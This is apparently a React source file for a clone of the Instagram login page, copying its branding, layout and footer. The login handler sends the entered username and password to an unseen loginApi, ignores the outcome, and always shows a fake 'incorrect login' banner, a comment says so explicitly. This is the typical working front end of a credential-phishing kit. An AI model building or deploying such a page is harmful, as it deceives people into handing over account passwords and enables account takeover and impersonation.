import { useState } from 'react'
import './App.css'
import { loginApi } from './api'

import instagramLogo from '../assets/instagramLogoDarkWithoutBack.png'
import leftImage from '../assets/left.png'

function App() {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)
  const [showError, setShowError] = useState(false)

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!username || !password) return
    setLoading(true)
    setShowError(false)
    try {
      await loginApi(username, password)
    } catch {
      // swallow — always show the wrong-credentials banner
    } finally {
      setLoading(false)
      setShowError(true)
    }
  }

  return (
    <div className="ig-root">
      {/* Main two-column area */}
      <div className="ig-body">

        {/* ── Left Panel ── */}
        <section className="ig-left">
          <div className="ig-left-content">
            <img src={instagramLogo} alt="Instagram" className="ig-logo" />
            <h1 className="ig-tagline">
              See everyday moments from your<br />
              <span className="ig-tagline-gradient">close friends.</span>
            </h1>
            <img src={leftImage} alt="Instagram moments" className="ig-collage" />
          </div>
        </section>

        {/* ── Right Panel ── */}
        <section className="ig-right">
          <div className="ig-right-inner">
            <div className="ig-login-header">
              <button className="ig-back-btn" aria-label="Back">&#8249;</button>
              <h2 className="ig-login-title">Log into Instagram</h2>
            </div>

            {showError && (
              <div className="ig-error-banner" role="alert">
                <span className="ig-error-icon" aria-hidden="true">
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="12" cy="12" r="11" stroke="#e87d35" strokeWidth="2" />
                    <path d="M12 7v5" stroke="#e87d35" strokeWidth="2" strokeLinecap="round" />
                    <circle cx="12" cy="16.5" r="1" fill="#e87d35" />
                  </svg>
                </span>
                <p className="ig-error-text">
                  The login information you entered is incorrect.{' '}
                  <a href="#" className="ig-error-link">Find your account and log in.</a>
                </p>
              </div>
            )}

            <form className="ig-form" onSubmit={handleLogin}>
              <input
                className="ig-input"
                type="text"
                placeholder="Mobile number, username or email"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                autoComplete="username"
              />
              <input
                className="ig-input"
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                autoComplete="current-password"
              />
              <button className="ig-btn-login" type="submit" disabled={loading}>
                {loading ? 'Logging in…' : 'Log in'}
              </button>
            </form>

            <a href="#" className="ig-forgot">Forgot password?</a>

            <div className="ig-separator" />

            <button className="ig-btn-facebook">
              {/* Facebook SVG icon */}
              <svg className="ig-fb-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <circle cx="12" cy="12" r="12" fill="#1877F2" />
                <path
                  d="M16.5 8H14.5C14.2 8 14 8.2 14 8.5V10H16.5L16.1 12.5H14V19H11.5V12.5H9.5V10H11.5V8.3C11.5 6.5 12.6 5.5 14.3 5.5C15.1 5.5 16 5.6 16.5 5.7V8Z"
                  fill="white"
                />
              </svg>
              Log in with Facebook
            </button>

            <button className="ig-btn-create">
              Create new account
            </button>

            {/* Meta logo as inline SVG text */}
            <div className="ig-meta-wrap">
              <svg className="ig-meta-svg" viewBox="0 0 80 20" xmlns="http://www.w3.org/2000/svg">
                <text x="0" y="16" fontFamily="-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial" fontSize="14" fill="#888" fontWeight="500">
                  &#x221E; Meta
                </text>
              </svg>
            </div>
          </div>
        </section>
      </div>

      {/* Footer */}
      <footer className="ig-footer">
        <nav className="ig-footer-links">
          {['Meta', 'About', 'Blog', 'Jobs', 'Help', 'API', 'Privacy', 'Terms', 'Locations',
            'Instagram Lite', 'Meta AI', 'Threads', 'Contact Uploading & Non-Users', 'Meta Verified']
            .map((link) => (
              <a key={link} href="#" className="ig-footer-link">{link}</a>
            ))}
        </nav>
        <div className="ig-footer-bottom">
          <span className="ig-footer-lang">English &#x2304;</span>
          <span className="ig-footer-copy">&copy; 2026 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  )
}

export default App
